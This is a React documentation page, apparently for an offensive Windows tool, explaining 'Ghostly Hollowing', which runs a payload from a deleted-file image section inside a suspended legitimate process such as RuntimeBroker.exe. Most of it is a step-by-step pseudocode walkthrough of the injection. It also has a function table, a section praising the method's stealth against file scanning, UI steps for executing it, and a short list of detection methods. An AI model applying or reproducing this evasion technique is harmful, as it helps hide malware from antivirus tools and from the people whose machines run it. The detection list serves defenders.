import { Badge } from "@/components/ui/badge";
import { CodeBlock } from "@/components/code-block";
import { WarningBox } from "@/components/warning-box";

export default function GhostlyHollowingPage() {
  return (
    <div className="space-y-8">
      <div>
        <div className="flex items-center gap-3 mb-4">
          <h1 className="text-4xl font-bold">Ghostly Hollowing</h1>
          <Badge variant="outline">Ring 3</Badge>
        </div>
        <p className="text-lg text-muted-foreground">
          Combine process ghosting with process hollowing: execute a payload from a deleted 
          section inside a legitimate suspended process.
        </p>
      </div>

      <WarningBox variant="danger" title="Advanced Evasion Technique">
        This combines two evasion techniques for enhanced stealth. The on-disk file is 
        deleted, and execution occurs inside a legitimate process. Use only for authorized 
        security research.
      </WarningBox>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Overview</h2>
        <p className="text-muted-foreground">
          Ghostly Hollowing merges two techniques:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <strong>Process Ghosting</strong> — Create an image section from a file marked for deletion, so the file disappears but the section survives</li>
          <li>• <strong>Process Hollowing</strong> — Map the ghost section into a suspended legitimate process and hijack its execution</li>
        </ul>
        <p className="text-muted-foreground mt-4">
          The result: payload executes inside a legitimate process (e.g., RuntimeBroker.exe), 
          backed by a section that has no corresponding file on disk.
        </p>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Algorithm</h2>
        <CodeBlock
          language="rust"
          filename="crates/misc/src/process/ghostly_hollow.rs"
          code={`pub fn ghostly_hollow_process(
    host_exe: &str,      // Legitimate process (e.g., RuntimeBroker.exe)
    payload_pe: &str,    // 64-bit PE payload
) -> Result<(u32, u32), MiscError> {  // Returns (PID, TID)
    
    // === Phase 1: Create Ghost Section ===
    
    // 1. Create temp file
    let temp_path = format!("{}\\GH_{}.tmp", temp_dir(), timestamp());
    
    // 2. Open file with DELETE permission
    let file_handle = NtOpenFile(
        &temp_path,
        DELETE | GENERIC_READ | GENERIC_WRITE,
        FILE_SUPERSEDE,
        FILE_DELETE_ON_CLOSE,
    )?;
    
    // 3. Mark file for deletion BEFORE writing
    //    File will be deleted when all handles close
    NtSetInformationFile(
        file_handle,
        FileDispositionInformation,
        DeleteFile: TRUE,
    )?;
    
    // 4. Write payload PE to temp file
    NtWriteFile(file_handle, payload_bytes)?;
    
    // 5. Create SEC_IMAGE section from the file
    //    This "ghosts" the file - section survives even after file is deleted
    let section_handle = NtCreateSection(
        SECTION_ALL_ACCESS,
        file_handle,
        SEC_IMAGE,
    )?;
    
    // 6. Close file handle - file is now DELETED
    //    But the section still exists with the PE image!
    CloseHandle(file_handle);
    
    // === Phase 2: Hollow the Host Process ===
    
    // 7. Create legitimate host process SUSPENDED
    let (process_handle, thread_handle, pid, tid) = CreateProcessW(
        host_exe,
        CREATE_SUSPENDED,
    )?;
    
    // 8. Map ghost section into suspended process
    let mapped_base = NtMapViewOfSection(
        section_handle,
        process_handle,
        ViewUnmap,  // Allow unmapping
    )?;
    
    // 9. Get thread context to find entry point register
    let context = GetThreadContext(thread_handle)?;
    
    // 10. Calculate payload entry point
    let entry_point = mapped_base + payload_entry_rva;
    
    // 11. Hijack thread: set RCX (entry point parameter on x64)
    context.Rcx = entry_point;
    SetThreadContext(thread_handle, &context)?;
    
    // 12. Patch PEB.ImageBase to point to mapped section
    let peb_addr = context.Rdx;  // RDX points to PEB on process start
    NtWriteVirtualMemory(
        process_handle,
        peb_addr + PEB_IMAGE_BASE_OFFSET,
        &mapped_base,
    )?;
    
    // 13. Resume thread - payload executes!
    ResumeThread(thread_handle)?;
    
    Ok((pid, tid))
}`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Key NT Functions</h2>
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 px-3 font-semibold">Function</th>
                <th className="text-left py-2 px-3 font-semibold">Purpose</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs text-violet">NtOpenFile</td>
                <td className="py-2 px-3 text-muted-foreground">Open file with DELETE permission</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs text-violet">NtSetInformationFile</td>
                <td className="py-2 px-3 text-muted-foreground">Mark file for deletion</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs text-violet">NtWriteFile</td>
                <td className="py-2 px-3 text-muted-foreground">Write payload to temp file</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs text-violet">NtCreateSection</td>
                <td className="py-2 px-3 text-muted-foreground">Create SEC_IMAGE section (the &quot;ghost&quot;)</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs text-violet">NtMapViewOfSection</td>
                <td className="py-2 px-3 text-muted-foreground">Map ghost section into target process</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs text-violet">NtWriteVirtualMemory</td>
                <td className="py-2 px-3 text-muted-foreground">Patch PEB.ImageBase</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Why It&apos;s Stealthier</h2>
        <div className="grid gap-4">
          <div className="p-4 rounded-lg border border-green-500/30 bg-green-500/10">
            <h3 className="font-semibold text-green-400 mb-2">✓ No File on Disk</h3>
            <p className="text-sm text-muted-foreground">
              The payload file is deleted before process execution begins. File-based 
              scanning cannot find the malicious PE.
            </p>
          </div>
          <div className="p-4 rounded-lg border border-green-500/30 bg-green-500/10">
            <h3 className="font-semibold text-green-400 mb-2">✓ Legitimate Process Name</h3>
            <p className="text-sm text-muted-foreground">
              Process appears as RuntimeBroker.exe (or chosen host) in Task Manager 
              and process listings.
            </p>
          </div>
          <div className="p-4 rounded-lg border border-green-500/30 bg-green-500/10">
            <h3 className="font-semibold text-green-400 mb-2">✓ No Suspicious Allocations</h3>
            <p className="text-sm text-muted-foreground">
              Unlike classic hollowing, no VirtualAllocEx needed - the section mapping 
              is more subtle.
            </p>
          </div>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Requirements</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <strong>64-bit payload</strong> — Only x64 PE files are supported</li>
          <li>• <strong>64-bit host</strong> — Host executable must also be 64-bit</li>
          <li>• <strong>Admin privileges</strong> — Required for process manipulation</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">UI Access</h2>
        <p className="text-muted-foreground">
          Access via Utilities tab → Ghostly Hollowing section:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <strong>Host executable picker</strong> — Select legitimate process (e.g., RuntimeBroker.exe)</li>
          <li>• <strong>PE payload picker</strong> — Select 64-bit payload to execute</li>
          <li>• <strong>Execute button</strong> — Performs the ghostly hollowing</li>
          <li>• <strong>Status feedback</strong> — Shows new PID or error details</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Comparison with Other Techniques</h2>
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 px-3 font-semibold">Technique</th>
                <th className="text-left py-2 px-3 font-semibold">File on Disk</th>
                <th className="text-left py-2 px-3 font-semibold">Process Name</th>
                <th className="text-left py-2 px-3 font-semibold">Detection Difficulty</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Process Hollowing</td>
                <td className="py-2 px-3 text-muted-foreground">Yes (payload)</td>
                <td className="py-2 px-3 text-muted-foreground">Legitimate</td>
                <td className="py-2 px-3 text-muted-foreground">Medium</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Process Ghosting</td>
                <td className="py-2 px-3 text-muted-foreground">No (deleted)</td>
                <td className="py-2 px-3 text-muted-foreground">Payload</td>
                <td className="py-2 px-3 text-muted-foreground">Hard</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-semibold text-violet">Ghostly Hollowing</td>
                <td className="py-2 px-3 text-muted-foreground">No (deleted)</td>
                <td className="py-2 px-3 text-muted-foreground">Legitimate</td>
                <td className="py-2 px-3 text-muted-foreground">Very Hard</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Detection</h2>
        <p className="text-muted-foreground">
          Ghostly Hollowing can be detected by:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Monitoring for <code>NtCreateSection</code> from delete-pending files</li>
          <li>• Comparing main module VAD to actual mapped sections</li>
          <li>• Detecting processes with sections that have no backing file</li>
          <li>• ETW tracing of file/section operations in sequence</li>
          <li>• Kernel callbacks monitoring <code>FileDispositionInformation</code> before section creation</li>
        </ul>
      </section>
    </div>
  );
}
